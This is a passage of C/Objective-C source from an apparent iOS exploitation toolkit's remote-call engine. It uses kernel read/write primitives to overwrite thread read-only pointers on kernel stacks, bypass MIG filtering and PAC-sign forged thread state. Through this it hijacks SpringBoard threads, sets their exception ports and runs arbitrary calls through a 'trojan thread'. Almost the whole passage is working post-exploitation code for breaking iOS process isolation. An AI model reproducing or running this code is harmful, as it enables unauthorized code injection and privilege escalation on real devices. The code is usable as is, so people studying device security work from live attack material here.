        "CFStringCreateWithCStringNoCopy",
        "CFStringGetCStringPtr",
        "CFStringGetLength",
        "CFNumberGetValue",
        "CFRelease",
        "CFRetain",
        "dlopen",
        "dlsym",
        "dladdr",
        "IOServiceMatching",
        "IOServiceGetMatchingService",
        "IORegistryEntryCreateCFProperty",
        "IOObjectRelease",
        "memset",
        "getpid",
        "pthread_create_suspended_np",
        "pthread_mach_thread_np",
        "thread_resume",
        "mmap",
        "sandbox_extension_issue_file",
        "sandbox_extension_issue_file_to_process",
        "sandbox_extension_consume",
    };

    for (size_t i = 0; i < sizeof(quietSymbols) / sizeof(quietSymbols[0]); i++) {
        if (strcmp(name, quietSymbols[i]) == 0)
            return false;
    }

    // Log-once symbols: emit the first invocation so it's visible in the log,
    // then go silent so per-window / per-iteration loops don't flood. CAS
    // means concurrent first-callers never both win.
    static struct { const char *name; volatile int logged; } logOnceTable[] = {
        { "objc_setAssociatedObject", 0 },
        { "objc_getAssociatedObject", 0 },
    };
    for (size_t i = 0; i < sizeof(logOnceTable) / sizeof(logOnceTable[0]); i++) {
        if (strcmp(name, logOnceTable[i].name) == 0) {
            return __sync_bool_compare_and_swap(&logOnceTable[i].logged, 0, 1);
        }
    }

    if (!stable)
        return true;

    return true;
}

#define CY_VPHONE_BRIDGE_MAGIC 0x43595342u
#define CY_VPHONE_BRIDGE_SOCK "/private/var/mobile/Library/Caches/com.zeroxjf.cyanide.vphone-springboard.sock"

typedef struct __attribute__((packed)) {
    uint32_t magic;
    uint32_t op;
    uint64_t addr;
    uint64_t size;
    uint64_t args[8];
    char name[128];
} CYVPhoneBridgeRequest;

typedef struct __attribute__((packed)) {
    uint32_t magic;
    uint32_t status;
    uint64_t result;
    uint64_t extra;
} CYVPhoneBridgeResponse;

static bool rc_read_full_fd(int fd, void *buf, size_t len)
{
    uint8_t *p = (uint8_t *)buf;
    while (len > 0) {
        ssize_t n = read(fd, p, len);
        if (n == 0) return false;
        if (n < 0) {
            if (errno == EINTR) continue;
            return false;
        }
        p += (size_t)n;
        len -= (size_t)n;
    }
    return true;
}

static bool rc_write_full_fd(int fd, const void *buf, size_t len)
{
    const uint8_t *p = (const uint8_t *)buf;
    while (len > 0) {
        ssize_t n = write(fd, p, len);
        if (n < 0) {
            if (errno == EINTR) continue;
            return false;
        }
        if (n == 0) return false;
        p += (size_t)n;
        len -= (size_t)n;
    }
    return true;
}

static int rc_vphone_bridge_connect(void)
{
    int fd = socket(AF_UNIX, SOCK_STREAM, 0);
    if (fd < 0) return -1;

    struct sockaddr_un sun;
    memset(&sun, 0, sizeof(sun));
    sun.sun_family = AF_UNIX;
    strlcpy(sun.sun_path, CY_VPHONE_BRIDGE_SOCK, sizeof(sun.sun_path));
    if (connect(fd, (struct sockaddr *)&sun, sizeof(sun)) != 0) {
        close(fd);
        return -1;
    }
    return fd;
}

static bool rc_vphone_bridge_request(CYVPhoneBridgeRequest *req,
                                     CYVPhoneBridgeResponse *resp,
                                     const void *writeData,
                                     void *readData)
{
    if (!req || !resp) return false;
    req->magic = CY_VPHONE_BRIDGE_MAGIC;

    int fd = rc_vphone_bridge_connect();
    if (fd < 0) {
        printf("[VPHONE-BRIDGE] connect failed errno=%d\n", errno);
        return false;
    }

    bool ok = rc_write_full_fd(fd, req, sizeof(*req));
    if (ok && writeData && req->op == 5 && req->size)
        ok = rc_write_full_fd(fd, writeData, (size_t)req->size);
    if (ok)
        ok = rc_read_full_fd(fd, resp, sizeof(*resp));
    if (ok && resp->magic != CY_VPHONE_BRIDGE_MAGIC)
        ok = false;
    if (ok && readData && req->op == 4 && resp->status == 0 && resp->extra)
        ok = rc_read_full_fd(fd, readData, (size_t)resp->extra);

    close(fd);
    return ok;
}

static bool rc_vphone_bridge_ping(void)
{
    CYVPhoneBridgeRequest req = { .op = 1 };
    CYVPhoneBridgeResponse resp = {0};
    return rc_vphone_bridge_request(&req, &resp, NULL, NULL) &&
           resp.status == 0 && resp.result == 1;
}

static uint64_t rc_vphone_bridge_call(uint32_t op, uint64_t pcAddr, const char *name,
                                      uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3,
                                      uint64_t x4, uint64_t x5, uint64_t x6, uint64_t x7)
{
    CYVPhoneBridgeRequest req = {0};
    CYVPhoneBridgeResponse resp = {0};
    req.op = op;
    req.addr = pcAddr;
    req.args[0] = x0; req.args[1] = x1; req.args[2] = x2; req.args[3] = x3;
    req.args[4] = x4; req.args[5] = x5; req.args[6] = x6; req.args[7] = x7;
    if (name && name[0])
        strlcpy(req.name, name, sizeof(req.name));

    if (!rc_vphone_bridge_request(&req, &resp, NULL, NULL) || resp.status != 0) {
        printf("[VPHONE-BRIDGE] call failed op=%u name=%s addr=%#llx status=%u\n",
               op, name ?: "(null)", pcAddr, resp.status);
        g_RC_success = false;
        return 0;
    }
    return resp.result;
}

static bool rc_vphone_bridge_unsafe_addr_call_name(const char *name)
{
    if (!name || !name[0]) return false;

    static const char *blocked[] = {
        "IOServiceMatching",
        "IOServiceGetMatchingService",
        "IORegistryEntryCreateCFProperty",
        "IOObjectRelease",
        "SBWorkspaceKillApplication",
    };
    for (size_t i = 0; i < sizeof(blocked) / sizeof(blocked[0]); i++) {
        if (strcmp(name, blocked[i]) == 0) return true;
    }
    return false;
}

static bool rc_vphone_bridge_read(uint64_t src, void *dst, uint64_t size)
{
    if (!dst || size == 0) return true;
    if (size > 0x100000) return false;
    CYVPhoneBridgeRequest req = { .op = 4, .addr = src, .size = size };
    CYVPhoneBridgeResponse resp = {0};
    bool ok = rc_vphone_bridge_request(&req, &resp, NULL, dst) &&
              resp.status == 0 && resp.extra == size;
    if (!ok) g_RC_success = false;
    return ok;
}

static bool rc_vphone_bridge_write(uint64_t dst, const void *src, uint64_t size)
{
    if (!src || size == 0) return true;
    if (size > 0x100000) return false;
    CYVPhoneBridgeRequest req = { .op = 5, .addr = dst, .size = size };
    CYVPhoneBridgeResponse resp = {0};
    bool ok = rc_vphone_bridge_request(&req, &resp, src, NULL) &&
              resp.status == 0;
    if (!ok) g_RC_success = false;
    return ok;
}

static void release_shmem_slot(int i)
{
    if (i < 0 || i >= SHMEM_CACHE_SIZE) return;
    if (g_RC_shmemCache[i].localAddress) {
        mach_vm_deallocate(mach_task_self_,
                           (mach_vm_address_t)g_RC_shmemCache[i].localAddress,
                           PAGE_SIZE);
    }
    if (g_RC_shmemCache[i].port) {
        mach_port_deallocate(mach_task_self_, (mach_port_name_t)g_RC_shmemCache[i].port);
    }
    memset(&g_RC_shmemCache[i], 0, sizeof(g_RC_shmemCache[i]));
    g_RC_shmemUseCounter[i] = 0;
}

static void clear_remote_shmem_cache(void)
{
    for (int i = 0; i < SHMEM_CACHE_SIZE; i++) {
        if (g_RC_shmemCache[i].used) release_shmem_slot(i);
    }
    g_RC_shmemClock = 0;
    g_RC_shmemEvictions = 0;
}

// Exposed so remote_objc.m can drop a stale alias before injecting a string.
// The cache is what lets remote_write land in a mapping that is no longer the
// target's live page; r_alloc_str() in remote/remote_objc.m relies on this.
void remote_clear_shmem_cache(void)
{
    clear_remote_shmem_cache();
}

static uint32_t reap_dead_port_names(const char *reason)
{
    mach_port_name_array_t names = NULL;
    mach_port_type_array_t types = NULL;
    mach_msg_type_number_t namesCount = 0;
    mach_msg_type_number_t typesCount = 0;
    kern_return_t kr = mach_port_names(mach_task_self_, &names, &namesCount, &types, &typesCount);
    if (kr != KERN_SUCCESS) return 0;

    mach_msg_type_number_t limit = namesCount < typesCount ? namesCount : typesCount;
    uint32_t dead = 0;
    for (mach_msg_type_number_t i = 0; i < limit; i++) {
        if ((types[i] & MACH_PORT_TYPE_DEAD_NAME) == 0) continue;
        if (mach_port_deallocate(mach_task_self_, names[i]) == KERN_SUCCESS) {
            dead++;
        }
    }

    if (dead && remote_call_verbose_logging()) {
        static volatile uint64_t reapTotal = 0;
        static volatile uint64_t reapEvents = 0;
        uint64_t total = __sync_add_and_fetch(&reapTotal, dead);
        uint64_t events = __sync_add_and_fetch(&reapEvents, 1);
        printf("[RemoteCall] reaped %u ports current=%u cumulative=%llu events=%llu\n",
               dead, namesCount, (unsigned long long)total, (unsigned long long)events);
    }

    if (names) {
        vm_deallocate(mach_task_self_,
                      (vm_address_t)names,
                      (vm_size_t)namesCount * sizeof(mach_port_name_t));
    }
    if (types) {
        vm_deallocate(mach_task_self_,
                      (vm_address_t)types,
                      (vm_size_t)typesCount * sizeof(mach_port_type_t));
    }
    return dead;
}

// Time based, not call based.
//
// This used to be "every 64th sign_state", and a call count is the wrong shape
// for a cost that is paid once per period. The overlay drives the call rate, so
// every-64th-calls meant the whole-task mach_port_names sweep ran three or four
// times a second at a healthy publish rate and proportionally more when a
// publish got slow, which is exactly the wrong direction: the enumeration runs
// inside g_universal_ipc_mutex and gRemoteCallLock, so it lands on top of every
// other call that is queued behind it.
//
// Once a second bounds it independently of how fast the overlay is running, and
// still keeps a hard ceiling on how long a dead port name can sit in the task's
// ipc space.
//
// A reap is not load bearing for correctness across sessions, either. Both
// teardown paths already reap unconditionally (abandon_remote_call_internal and
// destroy_remote_call_internal), and get_shmem_for_page reaps reactively when a
// page will not map. What this one covers is a long-lived session that never
// tears down, which is the only case that needs a periodic pass.
static void reap_dead_port_names_if_needed(const char *reason)
{
    static volatile uint64_t s_lastReap = 0;
    const uint64_t now = remote_call_diag_now_us();
    const uint64_t last = __sync_add_and_fetch(&s_lastReap, 0);
    if (last != 0 && now - last < 1000000ULL) return;
    __sync_lock_test_and_set(&s_lastReap, now);
    (void)reap_dead_port_names(reason);
}

bool set_exception_port_on_thread(mach_port_t exceptionPort, uint64_t currThread, bool useMigFilterBypass) {
    bool success = false;

    void* thread_set_exception_ports_addr = dlsym(RTLD_DEFAULT, "thread_set_exception_ports");
    void* pthread_exit_addr = dlsym(RTLD_DEFAULT, "pthread_exit");
    if (!thread_set_exception_ports_addr || !pthread_exit_addr) {
        printf("[%s:%d] missing thread_set_exception_ports/pthread_exit symbols\n",
               __FUNCTION__, __LINE__);
        return false;
    }
    if (!is_kaddr_valid(currThread)) {
        printf("[%s:%d] invalid target thread %#llx\n",
               __FUNCTION__, __LINE__, currThread);
        return false;
    }
    if (!g_RC_dummyThreadMach || !is_kaddr_valid(g_RC_dummyThreadAddr)) {
        printf("[%s:%d] dummy thread unavailable mach=0x%x addr=%#llx\n",
               __FUNCTION__, __LINE__, g_RC_dummyThreadMach, g_RC_dummyThreadAddr);
        return false;
    }

    pthread_t pthread = NULL;
    int createErr = pthread_create_suspended_np(&pthread, NULL,
        (void *(*)(void *))thread_set_exception_ports_addr, NULL);
    if (createErr != 0 || !pthread) {
        printf("[%s:%d] pthread_create_suspended_np failed err=%d thread=%p\n",
               __FUNCTION__, __LINE__, createErr, pthread);
        return false;
    }

    mach_port_t machThread = pthread_mach_thread_np(pthread);
    if (!machThread) {
        printf("[%s:%d] pthread_mach_thread_np returned null for helper thread\n",
               __FUNCTION__, __LINE__);
        pthread_cancel(pthread);
        return false;
    }
    uint64_t machThreadAddr = task_get_ipc_port_kobject(task_self(), machThread);
    if (!is_kaddr_valid(machThreadAddr)) {
        printf("[%s:%d] failed to resolve helper thread kobject mach=0x%x addr=%#llx\n",
               __FUNCTION__, __LINE__, machThread, machThreadAddr);
        pthread_cancel(pthread);
        mach_port_deallocate(mach_task_self_, machThread);
        return false;
    }

    if(useMigFilterBypass) {
        mig_bypass_monitor_threads(g_RC_selfThreadAddr, machThreadAddr);
    }

    arm_thread_state64_internal state;
    memset(&state, 0, sizeof(state));
    mach_msg_type_number_t count = ARM_THREAD_STATE64_COUNT;
    kern_return_t kr = thread_get_state(machThread, ARM_THREAD_STATE64,
                                        (thread_state_t)&state, &count);
    if (kr != KERN_SUCCESS) {
        printf("[%s:%d] thread_get_state failed: 0x%x (%s)\n",
               __FUNCTION__, __LINE__, kr, mach_error_string(kr));
        pthread_cancel(pthread);
        mach_port_deallocate(mach_task_self_, machThread);
        return false;
    }

    // The diversifier is read for the record. It is not applied to the state
    // below because thread_set_exception_ports and pthread_exit are reached with
    // a PC that carries no diversifier, so keeping it would only add a warning
    // about a value nothing consumes.
    (void)((uint64_t)state.__flags & __DARWIN_ARM_THREAD_STATE64_USER_DIVERSIFIER_MASK);

    arm_thread_state64_set_pc_fptr(state, thread_set_exception_ports_addr);
    arm_thread_state64_set_lr_fptr(state, pthread_exit_addr);

    uint64_t exceptionMask = EXC_MASK_GUARD |
                             EXC_MASK_BAD_ACCESS |
                             EXC_MASK_BAD_INSTRUCTION |
                             EXC_MASK_BREAKPOINT |
                             EXC_MASK_ARITHMETIC;

    state.__x[0] = g_RC_dummyThreadMach;
    state.__x[1] = exceptionMask;
    state.__x[2] = exceptionPort;
    state.__x[3] = EXCEPTION_STATE | MACH_EXCEPTION_CODES;
    state.__x[4] = ARM_THREAD_STATE64;

    if(useMigFilterBypass)
        usleep(100000);

    if (!thread_set_state_wrapper(machThread, machThreadAddr,
                                  (arm_thread_state64_internal *)&state))
    {
        pthread_cancel(pthread);
        mach_port_deallocate(mach_task_self_, machThread);
        return false;
    }

    if(useMigFilterBypass)
        usleep(100000);

    thread_set_mutex(g_RC_dummyThreadAddr, g_RC_selfThreadCtid);

    if (!thread_resume_wrapper(machThread))
    {
        pthread_cancel(pthread);
        mach_port_deallocate(mach_task_self_, machThread);
        return false;
    }

    for (int i = 0; i < 10; i++)
    {
        usleep(200000);

        uint64_t kstack = thread_get_kstackptr(machThreadAddr);
        if (!is_kaddr_valid(kstack)) {
            printf("[%s:%d] Failed to get valid kstack (%#llx). Retry...\n",
                   __FUNCTION__, __LINE__, kstack);
            continue;
        }

        uint64_t kernelSP = kread64(kstack + off_arm_kernel_saved_state_sp);
        if (!is_kaddr_valid(kernelSP)) {
            printf("[%s:%d] Failed to get valid SP (%#llx). Retry...\n",
                   __FUNCTION__, __LINE__, kernelSP);
            continue;
        }
        usleep(100);

        uint64_t pageBase = trunc_page(kernelSP) + 0x3000ULL;
        if (!is_kaddr_valid(pageBase)) {
            printf("[%s:%d] invalid helper stack probe page %#llx\n",
                   __FUNCTION__, __LINE__, pageBase);
            continue;
        }
        char dataBuff[0x1000];
        memset(dataBuff, 0, 0x1000);
        kreadbuf(pageBase, &dataBuff, 0x1000);

        uint64_t needleVal = g_RC_dummyThreadTro;
        void *match = memmem(dataBuff, 0x1000, &needleVal, sizeof(needleVal));
        if (!match) {
            printf("[%s:%d] Couldn't find g_RC_dummyThreadTro\n", __FUNCTION__, __LINE__);
            continue;
        }
        size_t foundOffset = (size_t)((uint8_t *)match - (uint8_t *)dataBuff);
        uint64_t found = (uint64_t)foundOffset + 0x3000;
        memset(dataBuff, 0, 0x1000);

        bool correctTro = false;
        uint64_t checkAddr = trunc_page(kernelSP) + found + 0x18ULL;
        uint64_t checkVal  = kread64(checkAddr);

        uint64_t checkAddr2 = trunc_page(kernelSP) + found + 0x10ULL;   // on iPad 7(arm64)/18.3.2, offsets may be different
        uint64_t checkVal2  = kread64(checkAddr2);

        if (checkVal == exceptionMask || checkVal2 == exceptionMask) {
            correctTro = true;
        } else {
            printf("[%s:%d] Wrong tro (%#llx/%#llx != %#llx). Retry...\n",
                   __FUNCTION__, __LINE__, checkVal, checkVal2, exceptionMask);
//            printf("[%s:%d] Wrong tro = 0x%llx (kread64 from 0x%llx, trunc_page(kernelSP) = 0x%llx), Retry...\n", __FUNCTION__, __LINE__, checkVal, checkAddr, trunc_page(kernelSP));
//            khexdump(trunc_page(kernelSP), 0x4000);
//            while(1) {};
            continue;
        }

        if (found && correctTro) {
            if (thread_get_task(currThread) == g_RC_taskAddr) {
                uint64_t tro = thread_get_t_tro(currThread);
                if (!is_kaddr_valid(tro)) {
                    printf("[%s:%d] target thread tro invalid %#llx\n",
                           __FUNCTION__, __LINE__, tro);
                    continue;
                }
                kwrite64(trunc_page(kernelSP) + found, tro);
                success = true;
                break;
            } else {
                printf("[%s:%d] got empty tro, skip writing\n", __FUNCTION__, __LINE__);
            }
        } else {
            NSLog(@"[%s:%d] didnt find tro for 0x%llx", __FUNCTION__, __LINE__, (uint64_t)currThread);
        }
    }

    thread_set_mutex(g_RC_dummyThreadAddr, 0x40000000);

    thread_set_exception_ports(g_RC_dummyThreadMach, 0, exceptionPort, EXCEPTION_STATE | MACH_EXCEPTION_CODES, ARM_THREAD_STATE64);

    if(useMigFilterBypass)
        usleep(100000);

    mach_port_deallocate(mach_task_self_, machThread);
    return success;
}

// Invoke mach thread op on remote targetThread without a target-task port.
// Local helper calls fn(dummyMach, x1, x2, x3); while blocked we rewrite
// dummy TRO on kstack to target TRO (same as set_exception_port_on_thread).
// expectNearby: if non-zero, require that value at TRO+0x10 or +0x18 (arg check).
static bool tro_swap_thread_op(uint64_t targetThread,
                               void *fn,
                               uint64_t x1, uint64_t x2, uint64_t x3,
                               uint64_t expectNearby,
                               const char *tag,
                               bool useMigFilterBypass)
{
    if (!fn || !is_kaddr_valid(targetThread))
        return false;
    if (!g_RC_dummyThreadMach || !is_kaddr_valid(g_RC_dummyThreadAddr))
        return false;

    void *pthread_exit_addr = dlsym(RTLD_DEFAULT, "pthread_exit");
    if (!pthread_exit_addr)
        return false;

    pthread_t pthread = NULL;
    int createErr = pthread_create_suspended_np(&pthread, NULL, (void *(*)(void *))fn, NULL);
    if (createErr != 0 || !pthread)
        return false;

    mach_port_t machThread = pthread_mach_thread_np(pthread);
    if (!machThread) {
        pthread_cancel(pthread);
        return false;
    }
    uint64_t machThreadAddr = task_get_ipc_port_kobject(task_self(), machThread);
    if (!is_kaddr_valid(machThreadAddr)) {
        pthread_cancel(pthread);
        mach_port_deallocate(mach_task_self_, machThread);
        return false;
    }

    if (useMigFilterBypass)
        mig_bypass_monitor_threads(g_RC_selfThreadAddr, machThreadAddr);

    arm_thread_state64_internal helperState;
    memset(&helperState, 0, sizeof(helperState));
    mach_msg_type_number_t count = ARM_THREAD_STATE64_COUNT;
    if (thread_get_state(machThread, ARM_THREAD_STATE64,
                         (thread_state_t)&helperState, &count) != KERN_SUCCESS) {
        pthread_cancel(pthread);
        mach_port_deallocate(mach_task_self_, machThread);
        return false;
    }

    arm_thread_state64_set_pc_fptr(helperState, fn);
    arm_thread_state64_set_lr_fptr(helperState, pthread_exit_addr);
    helperState.__x[0] = g_RC_dummyThreadMach;
    helperState.__x[1] = x1;
    helperState.__x[2] = x2;
    helperState.__x[3] = x3;

    if (useMigFilterBypass)
        usleep(100000);

    if (!thread_set_state_wrapper(machThread, machThreadAddr, &helperState)) {
        pthread_cancel(pthread);
        mach_port_deallocate(mach_task_self_, machThread);
        return false;
    }

    if (useMigFilterBypass)
        usleep(100000);

    thread_set_mutex(g_RC_dummyThreadAddr, g_RC_selfThreadCtid);

    if (!thread_resume_wrapper(machThread)) {
        pthread_cancel(pthread);
        mach_port_deallocate(mach_task_self_, machThread);
        return false;
    }

    bool success = false;
    uint64_t needleVal = g_RC_dummyThreadTro;
    for (int i = 0; i < 15; i++) {
        usleep(100000);

        uint64_t kstack = thread_get_kstackptr(machThreadAddr);
        if (!is_kaddr_valid(kstack))
            continue;
        uint64_t kernelSP = kread64(kstack + off_arm_kernel_saved_state_sp);
        if (!is_kaddr_valid(kernelSP))
            continue;

        uint64_t pageBase = trunc_page(kernelSP) + 0x3000ULL;
        if (!is_kaddr_valid(pageBase))
            continue;
        char dataBuff[0x1000];
        memset(dataBuff, 0, sizeof(dataBuff));
        kreadbuf(pageBase, dataBuff, sizeof(dataBuff));

        void *match = memmem(dataBuff, sizeof(dataBuff), &needleVal, sizeof(needleVal));
        if (!match)
            continue;
        size_t foundOffset = (size_t)((uint8_t *)match - (uint8_t *)dataBuff);
        uint64_t found = (uint64_t)foundOffset + 0x3000ULL;

        if (expectNearby) {
            uint64_t v1 = kread64(trunc_page(kernelSP) + found + 0x18ULL);
            uint64_t v2 = kread64(trunc_page(kernelSP) + found + 0x10ULL);
            if (v1 != expectNearby && v2 != expectNearby)
                continue;
        }

        if (thread_get_task(targetThread) != g_RC_taskAddr)
            continue;
        uint64_t tro = thread_get_t_tro(targetThread);
        if (!is_kaddr_valid(tro))
            continue;
        kwrite64(trunc_page(kernelSP) + found, tro);
        success = true;
        RC_DIAG("TRO %s: swapped %#llx", tag ? tag : "op", (unsigned long long)tro);
        break;
    }

    // Match set_exception_port_on_thread: unlock dummy mutex and return.
    // Do NOT pthread_join — on TRO miss the helper stays blocked in
    // thread_suspend/set_state and join hangs forever (log 16:13: main @0x201
    // WATCHDOG while parked waiting for this return).
    thread_set_mutex(g_RC_dummyThreadAddr, 0x40000000);
    if (useMigFilterBypass)
        usleep(100000);
    mach_port_deallocate(mach_task_self_, machThread);
    if (!success)
        RC_DIAG("TRO %s: failed to locate/swap TRO", tag ? tag : "op");
    return success;
}

// Park remote thread at FAKE_PC/LR with no target-task port:
// suspend → set_state(park) → resume (faults into secondExceptionPort).
// park_remote_thread_via_tro_swap installs a state into a target thread through a
// borrowed TRO, suspending, setting and resuming it in one balanced sequence.
//
// IT CANNOT DO THAT, and it is no longer asked to pretend it can.
//
// tro_swap_thread_op works like this, and reading it is the whole of the finding: it
// creates a LOCAL helper thread running fn, resumes it, then finds the helper's kernel
// stack, locates the helper's thread_resume_operation, verifies the target thread
// belongs to the target task, and kwrites the TARGET thread's TRO over the helper's.
// So when the kernel resumes that slot, the thread that actually runs is the target
// thread, continuing in the middle of fn.
//
// fn here is thread_set_state, and the thread that runs it is a SpringBoard thread.
// Its arguments are x0, x1, x2, x3, and x2 is the state buffer. The buffer is malloc'd
// in THIS process, so the address is a user address of this app. That address is not
// mapped in SpringBoard. The target thread therefore dereferences an unmapped address
// while inside thread_set_state, writes nothing, and the state is never installed —
// and the function reports success, because all it checks is that the TRO swap
// happened.
//
// That is not a new observation. It is what this file already recorded and did not
// connect: "thread_set_state returned kr=0 while the resumed thread still ran getpid
// with sp=0" is a set_state that did not set anything.
//
// So the reuse path has been reporting a park that never happened for its whole life,
// and every failure after it has been read as a fault in whatever came next. Making
// the state buffer live in the target needs a target-side write for 42 bytes, and
// this engine has no primitive for that: remote_write is the aliasing path the file
// distrusts, and a remote memcpy needs a target source. Until there is one, the honest
// thing is for this to say no in one line instead of succeeding and costing a round.
static bool park_remote_thread_via_tro_swap(uint64_t targetThread,
                                            const arm_thread_state64_internal *stateToInstall,
                                            bool useMigFilterBypass)
{
    (void)targetThread; (void)stateToInstall; (void)useMigFilterBypass;
    RC_DIAG("TRO park: refused — thread_set_state runs in the target but the state "
            "buffer is allocated here, so it installs nothing while reporting success");
    return false;
}

static bool park_remote_thread_via_tro_swap_unused(uint64_t targetThread,
                                            const arm_thread_state64_internal *stateToInstall,
                                            bool useMigFilterBypass)
{
    if (!is_kaddr_valid(targetThread)) {
        RC_DIAG("TRO park: invalid target %#llx", (unsigned long long)targetThread);
        return false;
    }
    if (!stateToInstall) {
        RC_DIAG("TRO park: no state to install");
        return false;
    }

    void *thread_suspend_addr = dlsym(RTLD_DEFAULT, "thread_suspend");
    void *thread_set_state_addr = dlsym(RTLD_DEFAULT, "thread_set_state");
    void *thread_resume_addr = dlsym(RTLD_DEFAULT, "thread_resume");
    if (!thread_suspend_addr || !thread_set_state_addr || !thread_resume_addr) {
        RC_DIAG("TRO park: missing suspend/set_state/resume");
        return false;
    }

    arm_thread_state64_internal *stateBuf =
        (arm_thread_state64_internal *)malloc(sizeof(*stateToInstall));
    if (!stateBuf) {
        RC_DIAG("TRO park: malloc stateBuf failed");
        return false;
    }
    memcpy(stateBuf, stateToInstall, sizeof(*stateToInstall));

    // Mark target as in-exception so set_state is accepted (same as wrapper).
    uint16_t options = thread_get_options(targetThread);
    thread_set_options(targetThread, (uint16_t)(options | TH_IN_MACH_EXCEPTION));

    bool ok = tro_swap_thread_op(targetThread, thread_suspend_addr,
                                 0, 0, 0, 0, "suspend", useMigFilterBypass);
    if (!ok) {
        RC_DIAG("TRO park: suspend failed");
        thread_set_options(targetThread, options);
        free(stateBuf);
        return false;
    }

    ok = tro_swap_thread_op(targetThread, thread_set_state_addr,
                            ARM_THREAD_STATE64,
                            (uint64_t)(uintptr_t)stateBuf,
                            ARM_THREAD_STATE64_COUNT,
                            ARM_THREAD_STATE64,
                            "set_state", useMigFilterBypass);
    thread_set_options(targetThread, options);
    if (!ok) {
        RC_DIAG("TRO park: set_state failed — best-effort resume");
        (void)tro_swap_thread_op(targetThread, thread_resume_addr,
                                 0, 0, 0, 0, "resume_fail", useMigFilterBypass);
        free(stateBuf);
        return false;
    }

    ok = tro_swap_thread_op(targetThread, thread_resume_addr,
                            0, 0, 0, 0, "resume", useMigFilterBypass);
    free(stateBuf);
    if (!ok) {
        RC_DIAG("TRO park: resume failed");
        return false;
    }
    return true;
}

// Returns false if the state could not be signed, and in that case the state
// is left with the unsigned pc/lr in it and must NOT be replied to the target.
//
// This used to return void and assign the result unconditionally. remote_pac
// signalled failure with -1, so a thread_create that failed inside it wrote
// 0xFFFFFFFFFFFFFFFF into SpringBoard's __pc and the reply handed the target's
// own thread a jump to nowhere. The comment on the state sanity check below
// records that this exact shape, a bogus PC and SP, is what took SpringBoard
// with SIGKILL on 2026-09-26. remote_pac now returns 0 on failure, which is the
// reason this can tell the two apart.
bool sign_state(uint64_t signingThread, arm_thread_state64_internal *state, uint64_t pc, uint64_t lr)
{
    reap_dead_port_names_if_needed("sign_state");

    if(gIsPACSupported) {
        uint64_t diver = 0;
        diver = (uint64_t)state->__flags & __DARWIN_ARM_THREAD_STATE64_USER_DIVERSIFIER_MASK;
        uint64_t discPC = ptrauth_blend_discriminator_wrapper(diver, ptrauth_string_discriminator_special("pc"));
        uint64_t discLR = ptrauth_blend_discriminator_wrapper(diver, ptrauth_string_discriminator_special("lr"));

        if (pc) {
            uint64_t signedPC = remote_pac(signingThread, pc, discPC);
            if (!signedPC) return false;
            uint32_t flags = state->__flags;
            flags &= ~__DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_PC;
            state->__flags = flags;
            state->__pc = signedPC;
        }
        if (lr) {
            uint64_t signedLR = remote_pac(signingThread, lr, discLR);
            if (!signedLR) return false;
            uint32_t flags = state->__flags;
            flags &= ~(__DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_LR |
                       __DARWIN_ARM_THREAD_STATE64_FLAGS_IB_SIGNED_LR);
            state->__flags = flags;
            state->__lr = signedLR;
        }
        return true;
    }

    if(!gIsPACSupported) {
        if (pc) state->__pc = pc;
        if (lr) state->__lr = lr;
    }
    return true;
}

bool remote_call_current_success(void)
{
    return g_RC_success;
}

int remote_call_current_pid(void)
{
    return g_RC_pid;
}

bool remote_call_uses_vphone_bridge(void)
{
    return g_RC_vphoneBridge;
}

// True when the thread that executes a remote call IS the target's main thread.
//
// Every call after init runs on the trojan thread, and the trojan thread is the
// first thread in the task's list, which is the main thread. A caller that is
// about to ask the main thread to do something must know this first: asking the
// main thread to run a block and then waiting for it, while running on the main
// thread, is a self deadlock. The main thread never returns to its runloop to
// deliver the block, so the wait never ends, and backboardd kills SpringBoard
// when the checkin goes stale.
//
// Logged on the device at the time of the kill, springboardd's report and the
// main thread's own state:
//     unresponsive dispatch queue(s): com.apple.main-thread
//     60 seconds since last successful checkin
//     thread 1552: mach_msg receive on port 0x73e840b4c063f347
//     thread 1552: turnstile blocked on task pid 296, hops: 2
//
// A slow frame does not park the main thread in a mach message receive with a
// turnstile block on this app's task. That is a deadlock and this is it.
bool remote_call_runs_on_target_main_thread(void)
{
    if (g_RC_vphoneBridge) return false;
    if (!g_RC_taskAddr || !g_RC_mainThreadAddr) return false;
    // While the extra thread is bootstrapping, calls run on the synthetic call
    // thread instead, and the main thread is parked, not executing anything.
    if (g_RC_creatingExtraThread) return false;
    return g_RC_trojanThreadAddr == g_RC_mainThreadAddr;
}

int remote_call_set_stable_timeout_floor_ms(int timeoutMS)
{
    int previous = g_RC_stableExceptionTimeoutFloorMS > 0 ? g_RC_stableExceptionTimeoutFloorMS : 10000;
    g_RC_stableExceptionTimeoutFloorMS = timeoutMS > 0 ? timeoutMS : 10000;
    return previous;
}

uint64_t do_remote_call_temp(int timeout, const char *name,
    uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3,
    uint64_t x4, uint64_t x5, uint64_t x6, uint64_t x7)
{
    pthread_once(&g_universal_ipc_mutex_once, init_universal_mutex);
    pthread_mutex_lock(&g_universal_ipc_mutex);
    uint64_t res = do_remote_call_temp_internal(timeout, name, x0, x1, x2, x3, x4, x5, x6, x7);
    pthread_mutex_unlock(&g_universal_ipc_mutex);
    return res;
}

uint64_t do_remote_call_temp_internal(int timeout, const char *name,
    uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3,
    uint64_t x4, uint64_t x5, uint64_t x6, uint64_t x7)
{
    int floorTimeout = g_RC_stableExceptionTimeoutFloorMS > 0 ? g_RC_stableExceptionTimeoutFloorMS : 10000;
    int newTimeout = (floorTimeout > timeout) ? floorTimeout : timeout;
    uint64_t pcAddr = native_strip((uint64_t)dlsym(RTLD_DEFAULT, name));

    g_RC_lastTempStep = 0;

    // A callee with no address is never sent.
    //
    // sign_state signs the PC only when pc is non-zero, because zero is not a code
    // address, and it leaves __pc alone when it is given zero. So a name that does
    // not resolve produces a state whose PC is whatever the thread was already
    // parked at, which here is the trap address 0x101. The thread re-faults at the
    // place it was already faulted, that arrives on the port this function is about
    // to read, and it is delivered as the return: the second wait completes, the
    // return value is a register the function never set, and the caller is told a
    // call happened.
    //
    // That is the exact failure this engine spent the last two rounds learning to
    // name, in its purest form, and it was still reachable here. The stable path
    // has always refused a null address; only this one did not.
    if (!pcAddr) {
        g_RC_lastTempStep = 13;
        RC_DIAG("temp/%s has no address (dlsym returned 0) — refusing to send",
                name ?: "?");
        g_RC_success = false;
        return 0;
